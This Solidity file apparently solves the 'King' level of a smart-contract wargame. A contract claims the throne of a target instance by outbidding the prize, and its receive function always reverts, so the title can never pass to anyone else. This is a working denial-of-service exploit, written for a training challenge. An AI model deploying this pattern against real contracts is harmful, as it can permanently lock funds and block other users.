// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./interfaces/9_IKing.sol";

address constant INSTANCE = 0x71D3235340d347343075932F7d5165e7aaB73BC2;

contract KingSolution {
    IKing instance = IKing(INSTANCE);

    function solve() external payable {
        (bool success,) = address(INSTANCE).call{value: instance.prize() + 1}("");
        assert(success);
    }

    receive() external payable {
        require(false);
    }
}